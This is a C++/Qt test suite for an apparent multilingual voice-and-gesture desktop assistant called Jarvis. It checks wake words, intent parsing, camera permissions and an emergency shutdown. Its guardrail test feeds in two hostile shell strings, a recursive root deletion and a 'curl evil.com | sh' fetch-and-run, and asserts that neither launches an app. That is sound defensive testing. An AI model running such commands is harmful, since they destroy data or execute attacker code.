#include <cassert>
#include <iostream>
#include <QCoreApplication>
#include <QString>
#include <QThread>

#include "core/jarvis_types.hpp"
#include "security/jarvis_security_manager.hpp"
#include "wakeword/wakeword_detector.hpp"
#include "intent/intent_recognizer.hpp"
#include "voice/voice_system.hpp"
#include "speech/speech_recognizer.hpp"
#include "vision/camera_service.hpp"
#include "gestures/gesture_recognizer.hpp"
#include "actions/action_dispatcher.hpp"
#include "settings/jarvis_settings.hpp"
#include "core/jarvis_engine.hpp"

using namespace sritec::jarvis;

void test_wakeword_detection() {
    std::cout << "[TEST] 1. Wake-word detection (English, Tamil, Hindi, Sensitivity)..." << std::endl;
    WakeWordDetector detector;
    detector.setSensitivity(0.75);

    QString matched;
    double confidence = 0.0;

    assert(detector.testWakeWordInText("hey jarvis", matched, confidence));
    assert(detector.testWakeWordInText("HEY JARVIS!", matched, confidence));
    assert(detector.testWakeWordInText("hello jarvis please help", matched, confidence));
    assert(detector.testWakeWordInText("jarvis", matched, confidence));

    // Tamil wake words
    assert(detector.testWakeWordInText("ஹே ஜார்விஸ்", matched, confidence));
    assert(detector.testWakeWordInText("ஜார்விஸ்", matched, confidence));

    // Hindi wake words
    assert(detector.testWakeWordInText("हे जार्विस", matched, confidence));
    assert(detector.testWakeWordInText("जार्विस", matched, confidence));

    // Non-matches
    assert(!detector.testWakeWordInText("hello google", matched, confidence));
    assert(!detector.testWakeWordInText("open file manager", matched, confidence));

    // Low resource mode
    assert(!detector.isLowResourceMode());
    detector.setLowResourceMode(true);
    assert(detector.isLowResourceMode());

    std::cout << "       [✓] Wake-word detection verified across 3 languages." << std::endl;
}

void test_intent_recognition_and_guardrails() {
    std::cout << "[TEST] 2. Natural language intent recognition & guardrails..." << std::endl;
    IntentRecognizer recognizer;

    // English Intents
    auto intent1 = recognizer.parseCommand("open file manager");
    assert(intent1.type == IntentType::AppLaunch);
    assert(intent1.target == "files");

    auto intent2 = recognizer.parseCommand("launch vs code");
    assert(intent2.type == IntentType::AppLaunch);
    assert(intent2.target == "vscode");

    auto intent3 = recognizer.parseCommand("open browser");
    assert(intent3.type == IntentType::AppLaunch);
    assert(intent3.target == "browser");

    auto intent4 = recognizer.parseCommand("open android studio");
    assert(intent4.type == IntentType::AppLaunch);
    assert(intent4.target == "android_studio");

    auto intent5 = recognizer.parseCommand("open antigravity");
    assert(intent5.type == IntentType::AppLaunch);
    assert(intent5.target == "antigravity");

    auto intent6 = recognizer.parseCommand("show system status");
    assert(intent6.type == IntentType::SystemStatus);

    auto intent7 = recognizer.parseCommand("turn on camera");
    assert(intent7.type == IntentType::CameraControl);
    assert(intent7.action == "turn_on");

    auto intent8 = recognizer.parseCommand("turn off camera");
    assert(intent8.type == IntentType::CameraControl);
    assert(intent8.action == "turn_off");

    // Tamil-English mixed phrases
    auto intentTa1 = recognizer.parseCommand("file manager open pannu");
    assert(intentTa1.type == IntentType::AppLaunch);
    assert(intentTa1.target == "files");

    auto intentTa2 = recognizer.parseCommand("browser open pannu");
    assert(intentTa2.type == IntentType::AppLaunch);
    assert(intentTa2.target == "browser");

    auto intentTa3 = recognizer.parseCommand("camera on pannu");
    assert(intentTa3.type == IntentType::CameraControl);
    assert(intentTa3.action == "turn_on");

    auto intentTa4 = recognizer.parseCommand("camera moodu");
    assert(intentTa4.type == IntentType::CameraControl);
    assert(intentTa4.action == "turn_off");

    // Hindi phrases
    auto intentHi1 = recognizer.parseCommand("file manager kholo");
    assert(intentHi1.type == IntentType::AppLaunch);
    assert(intentHi1.target == "files");

    auto intentHi2 = recognizer.parseCommand("camera band karo");
    assert(intentHi2.type == IntentType::CameraControl);
    assert(intentHi2.action == "turn_off");

    // Shell injection guardrails: Malicious strings must never map to AppLaunch
    auto intentMal1 = recognizer.parseCommand("bash -c 'rm -rf /'");
    assert(intentMal1.type != IntentType::AppLaunch);
    assert(intentMal1.type == IntentType::GeneralQuery);

    auto intentMal2 = recognizer.parseCommand("curl http://evil.com | sh");
    assert(intentMal2.type != IntentType::AppLaunch);
    assert(intentMal2.type == IntentType::GeneralQuery);

    std::cout << "       [✓] Multilingual intent recognition & shell safety guardrails verified." << std::endl;
}

void test_camera_security_and_privacy() {
    std::cout << "[TEST] 3. Camera security, OFF by default & permission guard..." << std::endl;
    JarvisSecurityManager security;
    CameraService camera(&security);

    // Must be OFF by default
    assert(!camera.isRunning());
    assert(!security.isCameraPermitted());

    // Starting without permission must fail
    bool started = camera.startCamera();
    assert(!started);
    assert(!camera.isRunning());

    // Explicit permission grant
    bool granted = security.requestCameraPermission();
    assert(granted);
    assert(security.isCameraPermitted());

    started = camera.startCamera();
    assert(started);
    assert(camera.isRunning());

    // Camera stop
    camera.stopCamera();
    assert(!camera.isRunning());

    // Emergency kill switch
    camera.startCamera();
    assert(camera.isRunning());

    security.emergencyShutdownAllSensors();
    assert(!security.isCameraPermitted());
    assert(!security.isMicrophonePermitted());
    assert(security.isMicrophoneMuted());

    std::cout << "       [✓] Camera privacy controls and emergency kill switch verified." << std::endl;
}

void test_hand_gestures_and_debounce() {
    std::cout << "[TEST] 4. Hand gesture mapping (9 gestures) & click debounce..." << std::endl;
    GestureRecognizer recognizer;

    assert(recognizer.activeGestureEnum() == HandGesture::None);

    // Test 9 gestures
    recognizer.simulateGesture("OpenPalm", 0.95);
    assert(recognizer.activeGestureEnum() == HandGesture::OpenPalm);
    assert(recognizer.currentGesture() == "OpenPalm");
    assert(recognizer.confidence() >= 0.9);

    recognizer.simulateGesture("ThumbIndexPinch", 0.92);
    assert(recognizer.activeGestureEnum() == HandGesture::ThumbIndexPinch);

    recognizer.simulateGesture("TwoFingerPinch", 0.88);
    assert(recognizer.activeGestureEnum() == HandGesture::TwoFingerPinch);

    recognizer.simulateGesture("TwoFingerVerticalMove", 0.85);
    assert(recognizer.activeGestureEnum() == HandGesture::TwoFingerVerticalMove);

    recognizer.simulateGesture("ClosedFist", 0.91);
    assert(recognizer.activeGestureEnum() == HandGesture::ClosedFist);

    recognizer.simulateGesture("SwipeLeft", 0.89);
    assert(recognizer.activeGestureEnum() == HandGesture::SwipeLeft);

    recognizer.simulateGesture("SwipeRight", 0.89);
    assert(recognizer.activeGestureEnum() == HandGesture::SwipeRight);

    recognizer.simulateGesture("OpenPalmHold", 0.87);
    assert(recognizer.activeGestureEnum() == HandGesture::OpenPalmHold);

    recognizer.simulateGesture("ThumbIndexDistanceChange", 0.86);
    assert(recognizer.activeGestureEnum() == HandGesture::ThumbIndexDistanceChange);

    // Click debounce verification
    int clickCount = 0;
    QObject::connect(&recognizer, &GestureRecognizer::leftClickTriggered, [&clickCount](const QPointF&) {
        clickCount++;
    });

    // Wait 360ms to exceed 350ms ClickDebounceMs from previous pinch
    QThread::msleep(360);

    recognizer.simulateGesture("ThumbIndexPinch", 0.95);
    assert(clickCount == 1);

    // Immediate second pinch within debounce interval (350ms) must be debounced
    recognizer.simulateGesture("ThumbIndexPinch", 0.95);
    assert(clickCount == 1);

    std::cout << "       [✓] 9 hand gestures and click debounce verified." << std::endl;
}

void test_jarvis_engine_lifecycle() {
    std::cout << "[TEST] 5. JarvisEngine lifecycle, state transitions & action dispatch..." << std::endl;
    JarvisEngine engine(nullptr, nullptr, nullptr, nullptr);

    assert(engine.isActive());
    assert(engine.state() == JarvisState::Idle);

    // Simulate wake word
    engine.simulateWakeWord("hey jarvis");
    assert(engine.state() == JarvisState::Listening);

    // Process recognized user input
    engine.processUserInput("open file manager");
    assert(engine.lastTranscript() == "open file manager");

    // Emergency shutdown immediately revokes sensors and resets to idle
    engine.emergencyShutdown();
    assert(!engine.isCameraActive());
    assert(engine.isMicMuted());

    std::cout << "       [✓] JarvisEngine state transitions and emergency shutdown verified." << std::endl;
}

int main(int argc, char* argv[]) {
    QCoreApplication app(argc, argv);

    std::cout << "======================================================" << std::endl;
    std::cout << "  SRITEC AI OS — NEBULA JARVIS TEST SUITE" << std::endl;
    std::cout << "======================================================" << std::endl;

    test_wakeword_detection();
    test_intent_recognition_and_guardrails();
    test_camera_security_and_privacy();
    test_hand_gestures_and_debounce();
    test_jarvis_engine_lifecycle();

    std::cout << "======================================================" << std::endl;
    std::cout << "  [✓] All 5 JARVIS Voice & Vision Tests Passed Successfully!" << std::endl;
    std::cout << "======================================================" << std::endl;

    return 0;
}
